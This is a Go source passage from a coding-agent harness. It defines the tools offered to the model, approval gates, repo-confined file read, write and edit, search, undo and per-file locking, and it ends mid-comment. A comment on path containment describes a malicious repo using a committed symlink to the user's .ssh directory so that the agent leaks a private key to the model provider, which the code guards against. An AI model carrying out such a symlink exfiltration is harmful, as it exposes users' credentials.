// Package agent implements a tool-using coding assistant loop over an
// OpenAI-compatible chat model: the model requests tools (read/list/search/
// write/edit/run), the agent executes them (with approval for anything that
// changes the repo), and feeds results back until the model produces a final
// answer.
package agent

import (
	"bufio"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"kaioken/internal/agent/events"
	"kaioken/internal/config"
	"kaioken/internal/ext"
	"kaioken/internal/llm"
	"kaioken/internal/memory"
)

// maxReadBytes caps a single read_file / write preview.
const maxReadBytes = 100_000

// ApprovalRequest is shown to the user before a repo-changing action.
type ApprovalRequest struct {
	Action  string // "write", "edit", "run"
	Target  string // path or command
	Preview string // diff or command text
	// Canonical is what an "always allow" would actually grant: for a command
	// the meaning-carrying prefix (`go test`, not the full line with its
	// flags), for anything else the target itself. The front-end shows it, so
	// the user is told the scope of the permission they are granting rather
	// than guessing it.
	Canonical string
}

// UndoEntry captures a file's state just before a write_file/edit_file
// applied, so the front-end can offer /undo.
type UndoEntry struct {
	Path            string
	HadPrevious     bool // false means the file did not exist before (new file)
	PreviousContent string
}

// UI is how the agent talks to the front-end. All methods are called from the
// agent's goroutine.
type UI interface {
	// AssistantDelta receives assistant prose as it streams in. It is called
	// from the network goroutine and must not block. Assistant is still called
	// with the complete text afterwards, so a front-end may render deltas as a
	// provisional live region and replace it on completion.
	AssistantDelta(text string)
	Assistant(text string)                      // the complete model prose
	Tool(name, args string)                     // a tool is about to run
	ToolResult(name, result string, isErr bool) // tool finished
	Info(text string)                           // status/notes
	Approve(req ApprovalRequest) bool           // BLOCKS for user y/n
	RecordUndo(e UndoEntry)                     // a write/edit was applied
}

// Agent holds the configuration for a run.
type Agent struct {
	Client      *llm.Client
	Root        string // absolute repo root; all file ops are confined here
	UI          UI
	AutoApprove bool // when true, repo-changing actions skip the prompt
	MaxSteps    int
	AllowRun    bool // whether run_command is offered
	NoStream    bool // buffer the whole reply instead of streaming it
	Mode        Mode // permission preset; the zero value behaves as build
	// Depth is how many levels of delegation deep this agent is. Zero is the
	// agent the user talks to; a sub-agent spawned by the task tool is one.
	// It gates further delegation — see maxSubAgentDepth.
	Depth int
	// MemoryDisabled hides the remember/recall tools and the experience loop.
	// Project memory already on disk still reaches the prompt via the memory
	// context source; only the agent's ability to write more is removed.
	MemoryDisabled bool
	// Budget guards the session's spend. Nil means no guardrails. It must be
	// shared with sub-agents (they bill the same client) and outlive the
	// per-turn Agent value — see BudgetGuard.
	Budget *BudgetGuard
	// Events receives the run's lifecycle events. Nil means the process-wide
	// events.Default bus; tests and sub-agents set their own for isolation.
	Events *events.Bus
	// Context accumulates the provider's own measurement of how much window
	// the conversation occupies. Like Budget it is shared and outlives the
	// per-turn Agent value. Nil disables the anchor and falls back to
	// estimation. Sub-agents must leave it nil — see ContextTracker.
	Context *ContextTracker
	// Notes tracks which directory-scoped AGENTS.md files have already been
	// delivered alongside a read. Shared and long-lived for the same reason as
	// Budget; nil delivers none. See DirNotes.
	Notes *DirNotes
	// Perms is the standing permissions ruleset. Nil uses default behavior (ask).
	Perms *Ruleset
	// Config carries the repo configuration for operation-level model
	// routing: sub-agents and other delegated work may run on a different
	// model than the conversation (see routedClient). Nil disables routing.
	Config *config.Config

	// qmu guards the steering and follow-up queues, which the front-end
	// goroutine fills via Steer/FollowUp while Run drains them between turns.
	qmu       sync.Mutex
	steering  []string
	followUps []string
}

// Tools returns the tool schemas offered to the model.
func (a *Agent) Tools() []llm.Tool {
	perms := PermissionsFor(a.Mode)
	tools := []llm.Tool{
		{Type: "function", Function: llm.FunctionDef{
			Name: "read_file",
			Description: "Read a UTF-8 text file from the repository. Each line is returned prefixed " +
				"with its line number for reference — the numbers are not part of the file, so never " +
				"include them in write_file content or edit_file old_string. A long file comes back " +
				"capped; use offset and limit to page through the rest rather than re-reading from " +
				"the top.",
			Parameters: raw(`{"type":"object","properties":{
				"path":{"type":"string","description":"repo-relative file path"},
				"offset":{"type":"integer","description":"1-indexed line to start at; default 1"},
				"limit":{"type":"integer","description":"maximum number of lines to return; default 2000"}},
				"required":["path"]}`),
		}},
		{Type: "function", Function: llm.FunctionDef{
			Name:        "list_files",
			Description: "List the immediate entries of a directory in the repository.",
			Parameters: raw(`{"type":"object","properties":{
				"path":{"type":"string","description":"repo-relative directory path, default '.'"}}}`),
		}},
		{Type: "function", Function: llm.FunctionDef{
			Name:        "search",
			Description: "Case-insensitive substring search across text files. Returns path:line matches.",
			Parameters: raw(`{"type":"object","properties":{
				"query":{"type":"string","description":"text to search for"}},
				"required":["query"]}`),
		}},
		{Type: "function", Function: llm.FunctionDef{
			Name: "read_knowledge",
			Description: "Read Kaioken's generated documentation for this repo (knowledge cards " +
				"and wiki chapters). Call with no argument to list what exists. Faster than " +
				"reading source when you need orientation on a subsystem.",
			Parameters: raw(`{"type":"object","properties":{
				"doc":{"type":"string","description":"a path from the catalog, e.g. '.kaioken/wiki/Architecture'; omit to list everything"}}}`),
		}},
		{Type: "function", Function: llm.FunctionDef{
			Name: "query_prism",
			Description: "Query imported PRISM knowledge documents using Precision Retrieval with " +
				"Intelligent Source Matching (hybrid BM25 + semantic vector search with relevance gating). " +
				"Returns verified parent chunks and relevance flags. Use it to find facts in imported documents.",
			Parameters: raw(`{"type":"object","properties":{
				"query":{"type":"string","description":"search query or question to retrieve context for"},
				"module":{"type":"string","description":"optional module slug to scope retrieval to; omit to search default/first module"}},
				"required":["query"]}`),
		}},
	}
	// recall is read-only — it scans past-session digests, never touching disk —
	// so it is offered in every mode. It is the L2 session-recall layer.
	if !a.MemoryDisabled {
		tools = append(tools, llm.Tool{Type: "function", Function: llm.FunctionDef{
			Name: "recall",
			Description: "Search past sessions in this repo for ones matching a query, returning a " +
				"short digest (goal, files touched, outcome, gotchas) of each match. Use it when " +
				"the current task resembles something done before and you want to learn what " +
				"worked. Omit the query to list the most recent sessions.",
			Parameters: raw(`{"type":"object","properties":{
				"query":{"type":"string","description":"free-text to match against past session digests; omit for the most recent"}}}`),
		}})
	}
	if perms.CanWrite {
		tools = append(tools, llm.Tool{Type: "function", Function: llm.FunctionDef{
			Name:        "write_file",
			Description: "Create or overwrite a file with the given content. Requires user approval.",
			Parameters: raw(`{"type":"object","properties":{
				"path":{"type":"string"},
				"content":{"type":"string"}},
				"required":["path","content"]}`),
		}}, llm.Tool{Type: "function", Function: llm.FunctionDef{
			Name: "edit_file",
			Description: "Replace old_string with new_string in a file. old_string must match uniquely; " +
				"minor differences in smart quotes, dashes, and trailing whitespace are tolerated. " +
				"Batch several replacements to the same file with edits. Requires user approval.",
			Parameters: raw(`{"type":"object","properties":{
				"path":{"type":"string"},
				"old_string":{"type":"string"},
				"new_string":{"type":"string"},
				"edits":{"type":"array","description":"batch of replacements applied together; use instead of old_string/new_string",
					"items":{"type":"object","properties":{
						"old_string":{"type":"string"},
						"new_string":{"type":"string"}},
						"required":["old_string","new_string"]}}},
				"required":["path"]}`),
		}})
		if !a.MemoryDisabled {
			tools = append(tools, llm.Tool{Type: "function", Function: llm.FunctionDef{
				Name: "remember",
				Description: "Record a durable fact the agent should keep for future sessions in this " +
					"repo. Use it for tribal knowledge the code does not state and the agent learned " +
					"by doing: a registry that must be updated in lockstep, a test that flakes when " +
					"run a certain way, a command that works where the documented one does not. " +
					"With rewrite=true, replace the whole memory (use to consolidate when near the " +
					"cap). Requires user approval. scope=user records a personal, cross-repo note.",
				Parameters: raw(`{"type":"object","properties":{
					"content":{"type":"string","description":"the concise fact to remember"},
					"rewrite":{"type":"boolean","description":"replace the whole memory file instead of appending; default false"},
					"scope":{"type":"string","enum":["project","user"],"description":"project (default) writes .kaioken/MEMORY.md; user writes ~/.kaioken/USER.md"}},
					"required":["content"]}`),
			}})
		}
	}
	if a.AllowRun && perms.CanRun {
		tools = append(tools, llm.Tool{Type: "function", Function: llm.FunctionDef{
			Name: "run_command",
			Description: "Run a shell command in the repo root and return its output. Requires user approval. " +
				"The command is killed if it outruns its timeout, so do not start servers or watchers " +
				"that never exit.",
			Parameters: raw(`{"type":"object","properties":{
				"command":{"type":"string","description":"the command line to execute"},
				"timeout":{"type":"number","description":"seconds to allow before the command is killed; default 120, maximum 600"}},
				"required":["command"]}`),
		}})
	}
	// Extension tools are classed with run_command: their effects live in
	// plugin code, so read-only modes never see them, and only the top-level
	// agent gets them — a delegate should not gain tools the conversation
	// never showed the user.
	if a.AllowRun && perms.CanRun && a.Depth == 0 {
		for _, mt := range ext.ToolSchemas() {
			params := raw(`{"type":"object"}`)
			if len(mt.InputSchema) > 0 {
				params = json.RawMessage(mt.InputSchema)
			}
			desc := strings.TrimSpace(mt.Description)
			if desc != "" {
				desc += " "
			}
			if mt.Kind == ext.TypeWasm {
				desc += "[extension " + mt.ExtID + " — sandboxed wasm plugin; requires user approval]"
			} else {
				desc += "[extension " + mt.ExtID + " — external MCP server, runs outside the sandbox; requires user approval]"
			}
			tools = append(tools, llm.Tool{Type: "function", Function: llm.FunctionDef{
				Name:        mt.FullName,
				Description: desc,
				Parameters:  params,
			}})
		}
	}
	// Delegation and the checklist are both offered in every mode — a
	// read-only sub-agent adds no permission the parent does not already have,
	// and a checklist changes nothing on disk — but only to the agent the user
	// is actually talking to. A delegate has one job and no standing to rewrite
	// the plan it was called from.
	if a.Depth < maxSubAgentDepth {
		tools = append(tools, taskTool(), todoTool())
	}
	// The writable delegate is only offered when the parent can write and is at
	// the top level: a sub-agent that can re-delegate would amplify token spend
	// unboundedly, and a read-only session has nothing useful to hand off.
	if a.Depth == 0 && perms.CanWrite {
		tools = append(tools, delegateTool())
	}
	// Runtime-registered tools follow extension rules: only the top-level
	// agent sees them, filtered by the current mode's permissions.
	if a.Depth == 0 {
		tools = append(tools, registeredSchemas(a.Mode)...)
	}
	return tools
}

func raw(s string) json.RawMessage { return json.RawMessage(s) }

// routedClient returns the client that should run a given operation role
// ("task", "impact", "compact", …): the model the config maps that role to,
// or the session client untouched when no routing is configured. WithModel
// starts fresh usage counters, so each routed model meters its own spend.
func (a *Agent) routedClient(role string) *llm.Client {
	if a.Config == nil {
		return a.Client
	}
	model := a.Config.ResolveModel(role)
	if model == "" || model == a.Client.Model {
		return a.Client // no routing configured for this role
	}
	return a.Client.WithModel(model)
}

// exec dispatches one tool call and returns a result string (errors are
// returned as text so the model can recover, not as Go errors).
func (a *Agent) execTool(ctx context.Context, tc llm.ToolCall) string {
	var args map[string]any
	if err := json.Unmarshal([]byte(tc.Function.Arguments), &args); err != nil {
		return "error: could not parse tool arguments: " + err.Error()
	}
	getStr := func(k string) string {
		if v, ok := args[k].(string); ok {
			return v
		}
		return ""
	}
	getBool := func(k string) bool {
		if v, ok := args[k].(bool); ok {
			return v
		}
		return false
	}
	// Numbers arrive as float64 from encoding/json, but models routinely send
	// them quoted. Accepting both costs one type switch and saves a retry.
	getNum := func(k string) float64 {
		switch v := args[k].(type) {
		case float64:
			return v
		case string:
			if f, err := strconv.ParseFloat(strings.TrimSpace(v), 64); err == nil {
				return f
			}
		}
		return 0
	}

	var rawResult string
	switch tc.Function.Name {
	case "read_file":
		rawResult = a.readFile(getStr("path"), int(getNum("offset")), int(getNum("limit")))
	case "list_files":
		p := getStr("path")
		if p == "" {
			p = "."
		}
		rawResult = a.listFiles(p)
	case "search":
		rawResult = a.search(getStr("query"))
	case "read_knowledge":
		rawResult = a.readKnowledge(getStr("doc"))
	case "query_prism":
		rawResult = a.queryPrism(ctx, getStr("query"), getStr("module"))
	case "recall":
		rawResult = a.recall(getStr("query"))
	case "write_file":
		if !PermissionsFor(a.Mode).CanWrite {
			return a.modeDenied("write_file")
		}
		rawResult = a.writeFile(getStr("path"), getStr("content"))
	case "edit_file":
		if !PermissionsFor(a.Mode).CanWrite {
			return a.modeDenied("edit_file")
		}
		// Parsed from the raw arguments: the batch form is structured, and the
		// decoded map would lose the item types json.Unmarshal already checked.
		edits, perr := parseEditArgs(tc.Function.Arguments)
		if perr != nil {
			return "error: " + perr.Error()
		}
		rawResult = a.editFile(getStr("path"), edits)
	case "remember":
		if !PermissionsFor(a.Mode).CanWrite {
			return a.modeDenied("remember")
		}
		rawResult = a.remember(getStr("content"), getBool("rewrite"), getStr("scope"))
	case "run_command":
		if !PermissionsFor(a.Mode).CanRun {
			return a.modeDenied("run_command")
		}
		rawResult = a.runCommand(ctx, getStr("command"), tc.ID, getNum("timeout"))
	case "task":
		rawResult = a.runTask(ctx, getStr("description"), getStr("prompt"), getStr("mode"))
	case "delegate":
		rawResult = a.runDelegate(ctx, getStr("description"), getStr("prompt"))
	case "todo":
		// Parsed from the raw arguments rather than the decoded map: the items
		// are structured, and re-deriving them from map[string]any would mean
		// hand-rolling the type checks json.Unmarshal already does.
		rawResult = a.updateTodos(tc.Function.Arguments)
	default:
		if rt, ok := lookupRegistered(tc.Function.Name); ok {
			if !rt.ReadOnly && !PermissionsFor(a.Mode).CanRun {
				return a.modeDenied(tc.Function.Name)
			}
			rawResult = rt.Run(ctx, a, tc.Function.Arguments)
		} else if mt, ok := ext.LookupTool(tc.Function.Name); ok {
			rawResult = a.callExtTool(ctx, mt, tc.Function.Arguments)
		} else {
			return "error: unknown tool " + tc.Function.Name
		}
	}

	boundRes, err := BoundOutput(a.Root, tc.ID, tc.Function.Name, rawResult, nil)
	if err != nil || !boundRes.WasTruncated {
		return rawResult
	}
	return boundRes.BoundedText
}


// extInvoke is the extension-tool dispatch, a variable so tests can stub the
// plugin machinery away.
var extInvoke = ext.CallTool

// callExtTool routes an extension tool call through the same gates as
// run_command: mode permissions first, then explicit approval naming the
// extension — the user must always see who is asking to run code.
func (a *Agent) callExtTool(ctx context.Context, mt ext.Tool, argsJSON string) string {
	if !PermissionsFor(a.Mode).CanRun {
		return a.modeDenied(mt.FullName)
	}
	preview := strings.TrimSpace(argsJSON)
	if preview == "" {
		preview = "(no arguments)"
	} else if pretty := prettyJSON(preview); pretty != "" {
		preview = pretty
	}
	if !a.approve("extension", mt.ExtID+" → "+mt.Name, preview) {
		return "user declined to run the extension tool"
	}
	out, err := extInvoke(ctx, a.Root, mt.ExtID, mt.Name, argsJSON)
	if err != nil {
		return "error: " + err.Error()
	}
	// No local size cap: execTool bounds every tool's result through
	// BoundOutput, which also spills the full text somewhere the model can go
	// read it. Cutting the string here as well would only cost the overflow
	// that BoundOutput was about to save.
	if strings.TrimSpace(out) == "" {
		return "(tool produced no output)"
	}
	return out
}

// prettyJSON re-indents a JSON document for the approval preview, or returns
// "" when the input is not valid JSON.
func prettyJSON(s string) string {
	var v any
	if json.Unmarshal([]byte(s), &v) != nil {
		return ""
	}
	out, err := json.MarshalIndent(v, "", "  ")
	if err != nil {
		return ""
	}
	return string(out)
}

// Path containment.
//
// Lexical containment — join, clean, check the prefix — only proves the path
// *spelled* inside the repo. It says nothing about where the path leads: a
// symlink committed into the repository resolves anywhere its target points,
// so `docs/notes -> C:\Users\me\.ssh` passes the spelling test and hands the
// agent a private key, which then travels to the model provider in the
// transcript. Cloning an unfamiliar repo and asking Kaioken about it is a
// normal thing to do, and that makes this reachable by the repo's author
// rather than only by the user.
//
// So resolution follows symlinks before deciding, the way pi keys its
// file-mutation queue on realpath. opencode instead turns a path outside the
// project into an explicit external_directory prompt — but opencode is built
// to work across directories, and Kaioken is not: Agent.Root documents that
// every file operation is confined to it. Approval-gating an escape would
// turn a fixed guarantee into a judgment call made dozens of times a session,
// and the answer is the same every time. Escapes are refused, symlinked or
// spelled out, on the read path and the write path alike. The error names the
// real destination so a legitimate one is at least diagnosable.

// resolve maps a repo-relative path to an absolute one and refuses anything
// that lands outside the repository.
//
// Symlinks are resolved over the deepest part of the path that exists: a
// write to a file that does not exist yet must still be checked against the
// real location of the directory it would land in.
func (a *Agent) resolve(rel string) (string, error) {
	rel = filepath.FromSlash(strings.TrimSpace(rel))
	absClean, err := filepath.Abs(filepath.Join(a.Root, rel))
	if err != nil {
		return "", err
	}
	rootClean, err := filepath.Abs(a.Root)
	if err != nil {
		return "", err
	}
	// The root itself may be reached through a symlink (/tmp on macOS is the
	// everyday case), so both sides are compared in real terms.
	if real, err := realPath(rootClean); err == nil {
		rootClean = real
	}
	if !within(rootClean, absClean) {
		return "", fmt.Errorf("path %q is outside the repository", rel)
	}

	real, err := evalExisting(absClean)
	if err != nil {
		return "", err
	}
	if !within(rootClean, real) {
		return "", fmt.Errorf("path %q is a link to %s, outside the repository", rel, real)
	}
	return absClean, nil
}

// within reports whether p is root or sits beneath it.
func within(root, p string) bool {
	if p == root {
		return true
	}
	return strings.HasPrefix(p, root+string(os.PathSeparator))
}

// evalExisting resolves links over the longest existing prefix of a path and
// re-attaches the rest. Resolution needs something that exists to interrogate,
// and a write names a file that does not exist yet — so the directory it would
// land in is what gets checked.
func evalExisting(abs string) (string, error) {
	rest := ""
	cur := abs
	for {
		real, err := realPath(cur)
		if err == nil {
			return filepath.Join(real, rest), nil
		}
		if !errors.Is(err, fs.ErrNotExist) {
			return "", err
		}
		parent := filepath.Dir(cur)
		if parent == cur {
			// Walked to the volume root without finding anything that exists.
			return abs, nil
		}
		rest = filepath.Join(filepath.Base(cur), rest)
		cur = parent
	}
}

// defaultReadLimit is how many lines a read returns when the model does not
// say. It matches opencode's and pi's default: enough for almost every source
// file in one call, small enough that a generated one does not eat the window.
const defaultReadLimit = 2000

// readFile returns a window of a text file. offset is 1-indexed and limit
// counts lines; both zero means "from the top, up to defaultReadLimit".
//
// The window exists because the previous behavior — read the whole file, cut
// it at 100 KB — left the remainder unreachable: there was no argument that
// could ask for it, so a long file was permanently half-visible. Reads are
// also refused on binary files. Decoding a PNG as UTF-8 produces a screen of
// replacement characters that costs thousands of tokens and tells the model
// nothing, and unlike a text file it cannot be paged past.
func (a *Agent) readFile(path string, offset, limit int) string {
	abs, err := a.resolve(path)
	if err != nil {
		return "error: " + err.Error()
	}
	info, err := os.Stat(abs)
	if err != nil {
		return "error: " + err.Error()
	}
	if info.IsDir() {
		return "error: " + path + " is a directory — use list_files"
	}
	data, err := os.ReadFile(abs)
	if err != nil {
		return "error: " + err.Error()
	}
	if isBinary(data) {
		return "error: " + path + " looks like a binary file, not UTF-8 text"
	}
	if offset < 1 {
		offset = 1
	}
	if limit <= 0 {
		limit = defaultReadLimit
	}

	text := string(data)
	lines := strings.Split(text, "\n")
	// A trailing newline is a terminator, not an empty final line.
	if n := len(lines); n > 1 && lines[n-1] == "" {
		lines = lines[:n-1]
	}
	total := len(lines)
	if offset > total {
		return fmt.Sprintf("error: offset %d is past the end of %s (%d lines)", offset, path, total)
	}
	end := offset - 1 + limit
	if end > total {
		end = total
	}
	window := lines[offset-1 : end]

	// The byte cap binds independently of the line cap: 500 lines of minified
	// JavaScript is one line short of nothing and 4 MB of context.
	kept, _, hitBytes := keepLines(window, len(window), maxReadBytes, Head)
	body := numberLines(kept, offset)
	last := offset + len(kept) - 1

	// Rules that govern this part of the tree ride along with the read — see
	// DirNotes. They go after the content so the file is what the model reads
	// first and the constraint is the last thing before it acts.
	notes := a.dirNotesFor(abs)

	switch {
	case hitBytes:
		return body + fmt.Sprintf("\n… [capped at %d KB. Showing lines %d-%d of %d — continue with offset=%d]",
			maxReadBytes/1024, offset, last, total, last+1) + notes
	case last < total:
		return body + fmt.Sprintf("\n… [showing lines %d-%d of %d — continue with offset=%d]",
			offset, last, total, last+1) + notes
	}
	return body + fmt.Sprintf("\n[lines %d-%d of %d — end of file]", offset, last, total) + notes
}

// numberLines prefixes each line with its position in the file, right-aligned
// so the code stays column-aligned. Numbers let the model cite a location and
// make a windowed read navigable — reading from offset=400 is meaningless if
// nothing says where you are.
//
// They are display only, and two places defend that: the edit matcher strips
// them when the model quotes read output back (see stripLineNumbers), and
// write_file refuses numbered content outright.
func numberLines(lines []string, offset int) string {
	width := len(strconv.Itoa(offset + len(lines) - 1))
	var b strings.Builder
	for i, l := range lines {
		if i > 0 {
			b.WriteByte('\n')
		}
		fmt.Fprintf(&b, "%*d: %s", width, offset+i, l)
	}
	return b.String()
}

// looksLineNumbered reports whether a block of content is read_file output
// pasted back verbatim — every non-empty line carrying a "N: " prefix — and
// returns the first such line for the error message.
//
// This is the one line-number failure no matcher fallback can catch: a model
// that reads a file and then writes it back wholesale would commit the
// numbers into the file, silently. The check is deliberately strict; source
// that genuinely opens every line with a number and a colon does not exist,
// but a diff or a log excerpt might, so a single unnumbered line clears it.
func looksLineNumbered(content string) (bool, string) {
	lines := strings.Split(content, "\n")
	first, numbered := "", 0
	for _, l := range lines {
		if strings.TrimSpace(l) == "" {
			continue
		}
		if !lineNumberPrefix.MatchString(l) {
			return false, ""
		}
		if first == "" {
			first = clipLine(l, 60)
		}
		numbered++
	}
	// One numbered line is a coincidence; a file of them is a paste.
	return numbered >= 2, first
}

// isBinary reports whether a file's leading bytes look like something other
// than text: a NUL byte settles it outright, and a high share of other
// control bytes settles the rest. The heuristic and the 30% threshold are
// opencode's.
func isBinary(data []byte) bool {
	sample := data
	if len(sample) > 4096 {
		sample = sample[:4096]
	}
	if len(sample) == 0 {
		return false
	}
	nonPrintable := 0
	for _, b := range sample {
		if b == 0 {
			return true
		}
		if b < 9 || (b > 13 && b < 32) {
			nonPrintable++
		}
	}
	return float64(nonPrintable)/float64(len(sample)) > 0.3
}

func (a *Agent) listFiles(path string) string {
	abs, err := a.resolve(path)
	if err != nil {
		return "error: " + err.Error()
	}
	entries, err := os.ReadDir(abs)
	if err != nil {
		return "error: " + err.Error()
	}
	var b strings.Builder
	for _, e := range entries {
		name := e.Name()
		if e.IsDir() {
			name += "/"
		}
		b.WriteString(name)
		b.WriteString("\n")
	}
	if b.Len() == 0 {
		return "(empty directory)"
	}
	return b.String()
}

// searchSkipDir reports whether a directory is excluded from search. It reads
// the same list the knowledge pipeline uses, which is the point: the agent's
// search had its own shorter copy that omitted .kaioken, so every search also
// scanned Kaioken's own session transcripts, generated wiki, and spilled tool
// output — and matched the conversation that asked the question.
func searchSkipDir(name string) bool {
	for _, ex := range config.DefaultExcludes {
		if name == ex {
			return true
		}
	}
	return false
}

func (a *Agent) search(query string) string {
	if strings.TrimSpace(query) == "" {
		return "error: empty query"
	}
	needle := strings.ToLower(query)
	var b strings.Builder
	matches := 0
	err := filepath.WalkDir(a.Root, func(p string, d os.DirEntry, err error) error {
		if err != nil || matches >= 100 {
			if matches >= 100 {
				return filepath.SkipAll
			}
			return nil
		}
		if d.IsDir() {
			if searchSkipDir(d.Name()) {
				return filepath.SkipDir
			}
			return nil
		}
		data, rerr := os.ReadFile(p)
		if rerr != nil || len(data) > maxReadBytes || isBinary(data) {
			return nil
		}
		rel, _ := filepath.Rel(a.Root, p)
		rel = filepath.ToSlash(rel)
		sc := bufio.NewScanner(strings.NewReader(string(data)))
		line := 0
		for sc.Scan() {
			line++
			if strings.Contains(strings.ToLower(sc.Text()), needle) {
				fmt.Fprintf(&b, "%s:%d: %s\n", rel, line, strings.TrimSpace(sc.Text()))
				matches++
				if matches >= 100 {
					return filepath.SkipAll
				}
			}
		}
		return nil
	})
	if err != nil && err != filepath.SkipAll {
		return "error: " + err.Error()
	}
	if matches == 0 {
		return "no matches"
	}
	return b.String()
}

// Mutation locking.
//
// A write is not one operation. It reads the file, renders a diff, blocks for
// the user's answer — which can take a minute — and only then writes. Nothing
// held the file across that gap, so anything that changed it in between was
// silently overwritten by content computed from the old bytes: the user fixing
// a typo in their editor while the approval prompt is up loses the fix, and no
// message anywhere says so.
//
// pi serializes mutations per file through a queue keyed on realpath;
// opencode holds a per-path lock and re-reads the file inside it. Both are
// doing the same thing — making read-compute-write atomic against the world.
// This is that, plus an explicit re-read after the approval gate, because the
// gap that matters in Kaioken is the one the user is standing in.
// Entries are never removed: dropping a mutex another goroutine is about to
// take is a race, and the map is bounded by the number of distinct files one
// session touches — a few dozen bytes each.
var fileLocks sync.Map // resolved path → *sync.Mutex

func lockFile(abs string) func() {
	v, _ := fileLocks.LoadOrStore(abs, &sync.Mutex{})
	mu := v.(*sync.Mutex)
	mu.Lock()
	return mu.Unlock
}

// verifyUnchanged re-reads a file after the approval gate and reports whether
// it still holds the bytes the pending change was computed from.
func verifyUnchanged(abs, expected string, existed bool) error {
	current, err := os.ReadFile(abs)
	switch {
	case errors.Is(err, fs.ErrNotExist):
		if existed {
			return fmt.Errorf("the file was deleted while the change was waiting for approval")
		}
		return nil
	case err != nil:
		return err
	case !existed:
		return fmt.Errorf("the file was created by something else while the change was waiting for approval")
	case string(current) != expected:
		return fmt.Errorf("the file changed while the change was waiting for approval — read it again and redo the edit against the current content")
	}
	return nil
}

func (a *Agent) writeFile(path, content string) string {
	abs, err := a.resolve(path)
	if err != nil {
		return "error: " + err.Error()
	}
	if numbered, line := looksLineNumbered(content); numbered {
		return "error: the content is line-numbered (" + strconv.Quote(line) + "). read_file numbers " +
			"lines for reference only — write the file's real text, without the numbers."
	}
	unlock := lockFile(abs)
	defer unlock()

	existingBytes, readErr := os.ReadFile(abs)
	existed := readErr == nil
	// A file that exists but cannot be read must not be treated as new: the
	// undo entry would say "delete this" and /undo would destroy it.
	if readErr != nil && !errors.Is(readErr, fs.ErrNotExist) {
		return "error: " + readErr.Error()
	}
	preview := diffPreview(string(existingBytes), content)
	if !a.approve("write", path, preview) {
		return "user declined to write " + path
	}
	if err := verifyUnchanged(abs, string(existingBytes), existed); err != nil {
		return "error: " + err.Error()
	}
	if err := os.MkdirAll(filepath.Dir(abs), 0o755); err != nil {
		return "error: " + err.Error()
	}
	if err := writePreservingMode(abs, content); err != nil {
		return "error: " + err.Error()
	}
	a.UI.RecordUndo(UndoEntry{Path: path, HadPrevious: existed, PreviousContent: string(existingBytes)})
	return "wrote " + path + fmt.Sprintf(" (%d bytes)", len(content))
}

// writePreservingMode writes content to an existing file without changing its
// permissions. os.WriteFile only applies its mode argument when creating, so
// the bug this avoids is narrower than it looks — but it is real on the path
// that matters: a fresh file gets 0644, and an agent that writes a shell
// script or a git hook produces one nobody can execute. Existing files keep
// whatever mode they had.
func writePreservingMode(abs, content string) error {
	if info, err := os.Stat(abs); err == nil {
		return os.WriteFile(abs, []byte(content), info.Mode().Perm())
	}
	return os.WriteFile(abs, []byte(content), 0o644)
}

// parseEditArgs accepts either the single old_string/new_string pair or the
// batched edits array, normalizing both to []Edit.
func parseEditArgs(argsJSON string) ([]Edit, error) {
	var p struct {
		Old   string `json:"old_string"`
		New   string `json:"new_string"`
		Edits []struct {
			Old string `json:"old_string"`
			New string `json:"new_string"`
		} `json:"edits"`
	}
	if err := json.Unmarshal([]byte(argsJSON), &p); err != nil {
		return nil, fmt.Errorf("could not parse tool arguments: %w", err)
	}
	if len(p.Edits) > 0 {
		out := make([]Edit, len(p.Edits))
		for i, e := range p.Edits {
			out[i] = Edit{Old: e.Old, New: e.New}
		}
		return out, nil
	}
	if p.Old == "" {
		return nil, fmt.Errorf("edit_file needs old_string/new_string or a non-empty edits array")
	}
	return []Edit{{Old: p.Old, New: p.New}}, nil
}

func (a *Agent) editFile(path string, edits []Edit) string {
	abs, err := a.resolve(path)
	if err != nil {
		return "error: " + err.Error()
	}
	unlock := lockFile(abs)
	defer unlock()

	data, err := os.ReadFile(abs)
	if err != nil {
		return "error: " + err.Error()
	}
	// Match in a BOM-free, LF-only view; restore both on write so the file
	// keeps its original encoding details.
	original := string(data)
	bom, text := stripBOM(original)
	ending := detectLineEnding(text)
	updated, usedFuzzy, usedNumbered, strategy, applyErr := applyEdits(normalizeToLF(text), edits, path)
	if applyErr != nil {
		return "error: " + applyErr.Error()
	}
	// The preview says how the match was reached, not just what changed. A
	// looser strategy is exactly when the user most needs to look at the diff
	// rather than wave it through.
	preview := editsPreview(edits)
	if usedFuzzy {
		preview += "(fuzzy-matched: quote/dash/trailing-whitespace differences were tolerated)\n"
	}
	switch strategy {
	case "line-trimmed":
		preview += "(matched ignoring each line's leading/trailing whitespace)\n"
	case "indentation-flexible":
		preview += "(matched at a different indentation level than the old text gave)\n"
	case "block-anchor":
		preview += "(matched on the first and last lines only — the middle differed; check the diff)\n"
	}
	if usedNumbered {
		preview += "(the old text carried read_file's line numbers; they were stripped before matching)\n"
	}
	if !a.approve("edit", path, preview) {
		return "user declined to edit " + path
	}
	if err := verifyUnchanged(abs, original, true); err != nil {
		return "error: " + err.Error()
	}
	if err := writePreservingMode(abs, bom+restoreLineEndings(updated, ending)); err != nil {
		return "error: " + err.Error()
	}
	a.UI.RecordUndo(UndoEntry{Path: path, HadPrevious: true, PreviousContent: original})
	if len(edits) > 1 {
		return fmt.Sprintf("edited %s (%d replacements)", path, len(edits))
	}
	return "edited " + path
}

// editsPreview renders the approval preview for an edit batch: one hunk per
// replacement, numbered when there is more than one.
func editsPreview(edits []Edit) string {
	var b strings.Builder
	for i, e := range edits {
		if len(edits) > 1 {
			fmt.Fprintf(&b, "edit %d of %d:\n", i+1, len(edits))
		}
		b.WriteString(hunkPreview(e.Old, e.New))
	}
	return b.String()
}

// Restore reverts a file to the state captured in an UndoEntry: the previous
// content, or deletion if the entry marks the file as newly created. It is
// exported so a front-end can implement /undo without instantiating an Agent.
func Restore(root string, e UndoEntry) error {
	abs := filepath.Join(root, filepath.FromSlash(e.Path))
	if e.HadPrevious {
		return os.WriteFile(abs, []byte(e.PreviousContent), 0o644)
	}
	return os.Remove(abs)
}

// Command execution limits, taken from opencode's bash tool: a default that
// covers an ordinary build or test run, and a ceiling no model-supplied value
// may exceed. Without a default an agent that runs a dev server or a command
// waiting on stdin blocks the session with no way out but killing Kaioken.
const (
	defaultCommandTimeout = 2 * time.Minute
	maxCommandTimeout     = 10 * time.Minute
	// killGrace is how long Wait may keep waiting for output after the process
	// tree has been killed. It exists because a detached grandchild can hold
